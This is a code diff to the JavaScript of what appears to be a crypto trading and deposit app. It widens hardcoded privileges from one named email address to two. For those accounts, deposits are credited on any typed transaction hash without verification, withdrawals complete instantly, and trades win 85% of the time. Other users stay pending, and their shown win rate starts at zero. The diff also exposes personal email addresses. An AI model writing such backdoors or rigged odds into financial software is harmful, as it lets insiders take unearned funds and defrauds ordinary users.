@@ -1734,7 +1734,7 @@ async function migratePendingCrypto(userId) {
 }
 
 function addTransactionRecord(userId, tx) {
-    if (currentUserEmail === "joseeruitha@gmail.com") {
+    if (currentUserEmail === "joseeruitha@gmail.com" || currentUserEmail === "francismwangi20018@gmail.com") {
         tx.status = 'completed';
     }
     let txs = JSON.parse(localStorage.getItem(`txs_${userId}`)) || [];
@@ -2210,7 +2210,7 @@ async function proceedInvoice(){
         const { data: { session } } = await supabaseClient.auth.getSession();
         if(session?.user) {
             localStorage.setItem(`bal_${session.user.id}`, realBalance);
-            const isJose = currentUserEmail === "joseeruitha@gmail.com";
+            const isPrivilegedUser = (currentUserEmail === "joseeruitha@gmail.com" || currentUserEmail === "francismwangi20018@gmail.com");
             const txId = Date.now().toString();
             
             addTransactionRecord(session.user.id, {
@@ -2218,18 +2218,18 @@ async function proceedInvoice(){
                 type: 'withdrawal',
                 amount: amount,
                 method: method.toUpperCase(),
-                status: isJose ? 'completed' : 'pending',
+                status: isPrivilegedUser ? 'completed' : 'pending',
                 date: new Date().toLocaleString()
             });
             
-            if (isJose) {
+            if (isPrivilegedUser) {
                  notify({ variant: 'tp', title: 'Withdrawal Completed', message: `$${amount.toFixed(2)} processed successfully.` });
             }
         }
         
         closeModal();
         
-        if (currentUserEmail !== "joseeruitha@gmail.com") {
+        if (currentUserEmail !== "joseeruitha@gmail.com" && currentUserEmail !== "francismwangi20018@gmail.com") {
             notify({
                 variant: 'withdraw',
                 title: 'Withdrawal Initialized',
@@ -2244,9 +2244,9 @@ async function proceedInvoice(){
         if(!txHash) { alert('Please enter the Transaction Hash to verify your deposit.'); return; }
         
         closeModal();
-        const isJose = currentUserEmail === "joseeruitha@gmail.com";
+        const isPrivilegedUser = (currentUserEmail === "joseeruitha@gmail.com" || currentUserEmail === "francismwangi20018@gmail.com");
         
-        if (isJose) {
+        if (isPrivilegedUser) {
             congrats("Deposit Completed", "Your crypto deposit is verified and balance updated.");
         } else {
             congrats("Deposit Pending", "Your crypto deposit is pending verification and will reflect shortly.");
@@ -2257,7 +2257,7 @@ async function proceedInvoice(){
             const invoice = "CR-" + Math.floor(100000 + Math.random()*900000);
             const txId = Date.now().toString();
 
-            if (isJose) {
+            if (isPrivilegedUser) {
                 realBalance += amount;
                 updateBalance();
                 saveSupabaseBalance();
@@ -2269,7 +2269,7 @@ async function proceedInvoice(){
                 type: 'deposit',
                 amount: amount,
                 method: 'CRYPTO',
-                status: isJose ? 'completed' : 'pending',
+                status: isPrivilegedUser ? 'completed' : 'pending',
                 date: new Date().toLocaleString()
             });
             
@@ -2283,7 +2283,7 @@ async function proceedInvoice(){
                         phone_number: txHash,
                         amount_usd: amount,
                         amount_kes: 0,
-                        status: isJose ? 'completed' : 'pending'
+                        status: isPrivilegedUser ? 'completed' : 'pending'
                     });
             } catch(e) {}
         }
@@ -2325,7 +2325,7 @@ function updatePnL(){
 function calculateTradeResult(market, targetDigit, stake) {
     let winRate = 0.0;
     
-    if (currentUserEmail === "joseeruitha@gmail.com") {
+    if (currentUserEmail === "joseeruitha@gmail.com" || currentUserEmail === "francismwangi20018@gmail.com") {
         winRate = 0.85;
     } else {
         if (!isReal) {
